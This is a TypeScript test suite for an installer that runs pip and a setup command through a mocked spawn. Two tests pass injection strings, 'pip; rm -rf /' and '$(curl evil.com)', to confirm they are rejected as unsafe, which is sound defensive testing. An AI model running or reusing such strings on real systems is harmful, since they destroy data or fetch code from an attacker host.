// Functional tests for install-handler. SG-035: each test invokes
// runBicameralInstall() and asserts on captured spawn calls + emitted
// progress events.

import { strict as assert } from 'assert';
import { EventEmitter } from 'events';
import { runBicameralInstall } from '../../../integrations/bicameral/install-handler';
import { InstallProgressEvent, BicameralInstallState } from '../../../integrations/bicameral/types';

interface SpawnCall { bin: string; args: string[]; opts: Record<string, unknown>; }

function makeFakeChild(exitCode: number, stdout = '', error?: Error): EventEmitter & { stdout: EventEmitter; stderr: EventEmitter; kill?: () => void } {
  const child = new EventEmitter() as EventEmitter & { stdout: EventEmitter; stderr: EventEmitter };
  (child as any).stdout = new EventEmitter();
  (child as any).stderr = new EventEmitter();
  setImmediate(() => {
    if (error) {
      child.emit('error', error);
      return;
    }
    if (stdout) (child.stdout as EventEmitter).emit('data', Buffer.from(stdout));
    child.emit('close', exitCode);
  });
  return child;
}

function makeSpawnFake(plan: Array<{ exitCode: number; stdout?: string; error?: Error }>) {
  const calls: SpawnCall[] = [];
  let i = 0;
  const fn = (bin: string, args: string[], opts: Record<string, unknown>) => {
    calls.push({ bin, args, opts });
    const next = plan[i] || { exitCode: 0 };
    i += 1;
    return makeFakeChild(next.exitCode, next.stdout, next.error) as never;
  };
  return { fn, calls };
}

function fakeVerify(state: BicameralInstallState): () => Promise<BicameralInstallState> {
  return async () => state;
}

suite('integrations/bicameral install-handler', () => {
  test('solo mode spawns pip install then bicameral-mcp setup --mode solo', async () => {
    const events: InstallProgressEvent[] = [];
    const spawnFake = makeSpawnFake([{ exitCode: 0 }, { exitCode: 0 }]);
    await runBicameralInstall({
      workspaceRoot: '/tmp/ws',
      onProgress: (e) => events.push(e),
      spawn: spawnFake.fn as never,
      verifyState: fakeVerify('configured-not-running'),
    }, 'solo');
    assert.equal(spawnFake.calls.length, 2);
    assert.equal(spawnFake.calls[0].bin, 'pip');
    assert.deepEqual(spawnFake.calls[0].args, ['install', 'bicameral-mcp']);
    assert.equal(spawnFake.calls[0].opts.shell, false);
    assert.equal(spawnFake.calls[1].bin, 'bicameral-mcp');
    assert.deepEqual(spawnFake.calls[1].args, ['setup', '--mode', 'solo']);
    assert.equal(spawnFake.calls[1].opts.shell, false);
    const last = events[events.length - 1];
    assert.equal(last.done, true);
    assert.equal(last.ok, true);
  });

  test('team mode passes --mode team to setup', async () => {
    const events: InstallProgressEvent[] = [];
    const spawnFake = makeSpawnFake([{ exitCode: 0 }, { exitCode: 0 }]);
    await runBicameralInstall({
      workspaceRoot: '/tmp/ws',
      onProgress: (e) => events.push(e),
      spawn: spawnFake.fn as never,
      verifyState: fakeVerify('configured-not-running'),
    }, 'team');
    assert.deepEqual(spawnFake.calls[1].args, ['setup', '--mode', 'team']);
  });

  test('pip install failure halts before setup', async () => {
    const events: InstallProgressEvent[] = [];
    const spawnFake = makeSpawnFake([{ exitCode: 1 }]);
    const result = await runBicameralInstall({
      workspaceRoot: '/tmp/ws',
      onProgress: (e) => events.push(e),
      spawn: spawnFake.fn as never,
    }, 'solo');
    assert.equal(spawnFake.calls.length, 1, 'setup must not be invoked when pip fails');
    assert.equal(result.ok, false);
    assert.match(result.error || '', /pip/);
    const pipStep = result.steps.find((s) => s.phase === 'pip-install');
    assert.equal(pipStep?.status, 'error');
  });

  test('setup failure surfaces error in final event', async () => {
    const events: InstallProgressEvent[] = [];
    const spawnFake = makeSpawnFake([{ exitCode: 0 }, { exitCode: 2 }]);
    const result = await runBicameralInstall({
      workspaceRoot: '/tmp/ws',
      onProgress: (e) => events.push(e),
      spawn: spawnFake.fn as never,
    }, 'solo');
    assert.equal(spawnFake.calls.length, 2);
    assert.equal(result.ok, false);
    const setupStep = result.steps.find((s) => s.phase === 'setup');
    assert.equal(setupStep?.status, 'error');
  });

  test('rejects unsafe pipCommand without spawning', async () => {
    const events: InstallProgressEvent[] = [];
    const spawnFake = makeSpawnFake([]);
    const result = await runBicameralInstall({
      workspaceRoot: '/tmp/ws',
      pythonCommand: 'pip; rm -rf /',
      onProgress: (e) => events.push(e),
      spawn: spawnFake.fn as never,
    }, 'solo');
    assert.equal(spawnFake.calls.length, 0);
    assert.equal(result.ok, false);
    assert.match(result.error || '', /unsafe/i);
  });

  test('rejects unsafe bicameralCommand without spawning', async () => {
    const events: InstallProgressEvent[] = [];
    const spawnFake = makeSpawnFake([]);
    const result = await runBicameralInstall({
      workspaceRoot: '/tmp/ws',
      bicameralCommand: '$(curl evil.com)',
      onProgress: (e) => events.push(e),
      spawn: spawnFake.fn as never,
    }, 'solo');
    assert.equal(spawnFake.calls.length, 0);
    assert.equal(result.ok, false);
  });

  test('rejects unknown mode without spawning', async () => {
    const events: InstallProgressEvent[] = [];
    const spawnFake = makeSpawnFake([]);
    const result = await runBicameralInstall({
      workspaceRoot: '/tmp/ws',
      onProgress: (e) => events.push(e),
      spawn: spawnFake.fn as never,
    }, 'enterprise' as never);
    assert.equal(spawnFake.calls.length, 0);
    assert.equal(result.ok, false);
    assert.match(result.error || '', /mode/i);
  });

  test('verify step probes install-detector and reports running state on success', async () => {
    const events: InstallProgressEvent[] = [];
    const spawnFake = makeSpawnFake([{ exitCode: 0 }, { exitCode: 0 }]);
    const result = await runBicameralInstall({
      workspaceRoot: '/tmp/ws',
      onProgress: (e) => events.push(e),
      spawn: spawnFake.fn as never,
      verifyState: fakeVerify('running'),
    }, 'solo');
    const verifyStep = result.steps.find((s) => s.phase === 'verify');
    assert.equal(verifyStep?.status, 'success');
    assert.equal(result.ok, true);
  });

  test('verify step reports error when state remains not-installed after install', async () => {
    const events: InstallProgressEvent[] = [];
    const spawnFake = makeSpawnFake([{ exitCode: 0 }, { exitCode: 0 }]);
    const result = await runBicameralInstall({
      workspaceRoot: '/tmp/ws',
      onProgress: (e) => events.push(e),
      spawn: spawnFake.fn as never,
      verifyState: fakeVerify('not-installed'),
    }, 'solo');
    const verifyStep = result.steps.find((s) => s.phase === 'verify');
    assert.equal(verifyStep?.status, 'error');
    assert.equal(result.ok, false);
  });

  test('spawn throw becomes a structured error', async () => {
    const events: InstallProgressEvent[] = [];
    const spawnFake = (_bin: string, _args: string[], _opts: Record<string, unknown>) => { throw new Error('ENOENT'); };
    const result = await runBicameralInstall({
      workspaceRoot: '/tmp/ws',
      onProgress: (e) => events.push(e),
      spawn: spawnFake as never,
    }, 'solo');
    assert.equal(result.ok, false);
    assert.match(result.error || '', /ENOENT/);
  });

  test('every spawn call uses shell:false', async () => {
    const events: InstallProgressEvent[] = [];
    const spawnFake = makeSpawnFake([{ exitCode: 0 }, { exitCode: 0 }]);
    await runBicameralInstall({
      workspaceRoot: '/tmp/ws',
      onProgress: (e) => events.push(e),
      spawn: spawnFake.fn as never,
      verifyState: fakeVerify('running'),
    }, 'solo');
    for (const call of spawnFake.calls) {
      assert.equal(call.opts.shell, false);
    }
  });

  // FX518 — B-BIC-5 sanitizer
  // eslint-disable-next-line @typescript-eslint/no-var-requires
  const { sanitizeStdoutTail } = require('../../../integrations/bicameral/install-handler');

  test('FX518 sanitizeStdoutTail strips ANSI CSI sequences (SGR colors)', () => {
    const out = sanitizeStdoutTail('\x1b[31mred\x1b[0m text');
    assert.equal(out, 'red text');
  });

  test('FX518 sanitizeStdoutTail strips C0 controls but preserves tab/newline/CR', () => {
    const out = sanitizeStdoutTail('a\x00b\x07c\td\ne\rf');
    assert.equal(out, 'abc\td\ne\rf');
  });

  test('FX518 sanitizeStdoutTail caps length to last 2048 chars by default', () => {
    const input = 'x'.repeat(3000);
    const out = sanitizeStdoutTail(input);
    assert.equal(out.length, 2048);
    assert.equal(out, 'x'.repeat(2048));
  });
});
